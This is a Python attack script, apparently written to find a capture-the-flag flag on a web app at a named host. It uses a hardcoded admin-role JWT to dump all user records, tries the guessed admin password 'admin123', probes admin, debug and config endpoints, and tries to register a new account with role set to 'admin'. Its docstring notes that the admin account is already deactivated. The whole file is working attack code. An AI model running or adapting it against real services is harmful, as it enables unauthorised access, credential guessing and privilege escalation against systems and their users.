#!/usr/bin/env python3
"""
The admin is deactivated - check if this reveals the flag
"""

import requests
import json
import re

base_url = "http://fresh-start-267.emergent.host"
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYTcyMWZjYzEtMTk5OS00NGViLWJjOTQtMDU0YjU4N2E2MDUzIiwiZW1haWwiOiJhZG1pbkBldGhhcmEuYWkiLCJuYW1lIjoiU3lzdGVtIEFkbWluIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzc3NTMzMTI2fQ.Lu6aYqa4j4EQHX463APGH0n73p_ziCQn3luWUSi-61U"

headers = {
    "Authorization": f"Bearer {token}",
    "User-Agent": "Mozilla/5.0"
}

print("="*70)
print("SEARCHING FOR FLAG AFTER ADMIN DEACTIVATION")
print("="*70)

# Check users endpoint for any flag hints
print("\n[1] Checking all users...")
try:
    resp = requests.get(f"{base_url}/api/users", headers=headers, timeout=15)
    if resp.status_code == 200:
        users = resp.json()
        print(f"Total users: {len(users)}")
        
        # Look for any user with flag in name/email
        for user in users:
            user_str = json.dumps(user).lower()
            if "flag" in user_str or "ctf" in user_str:
                print(f"\n*** FLAG FOUND IN USER DATA ***")
                print(json.dumps(user, indent=2))
        
        # Check if admin is deactivated
        admin = [u for u in users if u.get('email') == 'admin@ethara.ai']
        if admin:
            print(f"\nAdmin status: {admin[0]}")
            if not admin[0].get('is_active'):
                print("*** ADMIN IS DEACTIVATED ***")
except Exception as e:
    print(f"Error: {e}")

# Try to login with deactivated admin
print("\n[2] Attempting login with deactivated admin...")
try:
    resp = requests.post(
        f"{base_url}/api/auth/login",
        json={"email": "admin@ethara.ai", "password": "admin123"},
        timeout=10
    )
    print(f"Status: {resp.status_code}")
    print(f"Response: {resp.text}")
    
    # Check for flag in error message
    if "flag" in resp.text.lower():
        print("\n*** FLAG IN LOGIN RESPONSE ***")
        flags = re.findall(r'[Ff][Ll][Aa][Gg]\{[^}]+\}', resp.text)
        flags += re.findall(r'CTF\{[^}]+\}', resp.text)
        if flags:
            print(f"FLAGS: {flags}")
except Exception as e:
    print(f"Error: {e}")

# Check status endpoint
print("\n[3] Checking status endpoint...")
try:
    resp = requests.get(f"{base_url}/api/status", timeout=10)
    print(f"Status: {resp.status_code}")
    if resp.status_code != 404:
        print(f"Response: {resp.text[:500]}")
        if "flag" in resp.text.lower():
            print("\n*** FLAG IN STATUS ***")
except Exception as e:
    print(f"Error: {e}")

# Try various admin endpoints
print("\n[4] Trying admin endpoints...")
admin_endpoints = [
    '/api/admin/status',
    '/api/admin/health',
    '/api/admin/info',
    '/api/admin/debug',
    '/api/admin/config',
    '/api/system/status',
    '/api/system/info',
    '/api/debug',
    '/api/info',
    '/api/config'
]

for endpoint in admin_endpoints:
    try:
        resp = requests.get(f"{base_url}{endpoint}", headers=headers, timeout=5)
        if resp.status_code == 200:
            print(f"\n{endpoint}: {resp.status_code}")
            print(f"Response: {resp.text[:300]}")
            
            if "flag" in resp.text.lower():
                print(f"\n*** POTENTIAL FLAG AT {endpoint} ***")
                print(resp.text)
    except:
        pass

# Check if there's a special endpoint for crashed state
print("\n[5] Checking crash-related endpoints...")
crash_endpoints = [
    '/api/crashed',
    '/api/flag',
    '/flag',
    '/api/success',
    '/success',
    '/api/admin/flag',
    '/admin/flag',
    '/congratulations',
    '/api/congratulations'
]

for endpoint in crash_endpoints:
    try:
        resp = requests.get(f"{base_url}{endpoint}", headers=headers, timeout=5)
        print(f"{endpoint}: {resp.status_code}")
        
        if resp.status_code == 200:
            print(f"Response: {resp.text}")
            
            # Extract any flags
            flags = re.findall(r'[Ff][Ll][Aa][Gg]\{[^}]+\}', resp.text)
            flags += re.findall(r'CTF\{[^}]+\}', resp.text)
            if flags:
                print(f"\n*** FLAGS FOUND: {flags} ***")
    except Exception as e:
        pass

# Check the main page HTML for hidden flags
print("\n[6] Checking main page HTML...")
try:
    resp = requests.get(base_url, timeout=10)
    if resp.status_code == 200:
        # Look for flags in HTML comments
        comments = re.findall(r'<!--.*?-->', resp.text, re.DOTALL)
        for comment in comments:
            if "flag" in comment.lower():
                print(f"\nFlag in comment: {comment}")
        
        # Look for flag patterns
        flags = re.findall(r'[Ff][Ll][Aa][Gg]\{[^}]+\}', resp.text)
        flags += re.findall(r'CTF\{[^}]+\}', resp.text)
        if flags:
            print(f"\n*** FLAGS IN HTML: {flags} ***")
        
        # Look for hidden divs or data attributes
        hidden = re.findall(r'data-flag="([^"]+)"', resp.text)
        if hidden:
            print(f"\n*** HIDDEN FLAG: {hidden} ***")
except Exception as e:
    print(f"Error: {e}")

# Try to register a new admin
print("\n[7] Attempting to register new admin...")
try:
    resp = requests.post(
        f"{base_url}/api/auth/register",
        json={
            "email": "newadmin@test.com",
            "password": "password123",
            "name": "New Admin",
            "role": "admin"
        },
        timeout=10
    )
    print(f"Status: {resp.status_code}")
    print(f"Response: {resp.text[:300]}")
    
    if "flag" in resp.text.lower():
        print("\n*** FLAG IN REGISTER RESPONSE ***")
except Exception as e:
    print(f"Error: {e}")

print("\n" + "="*70)
print("FLAG SEARCH COMPLETE")
print("="*70)
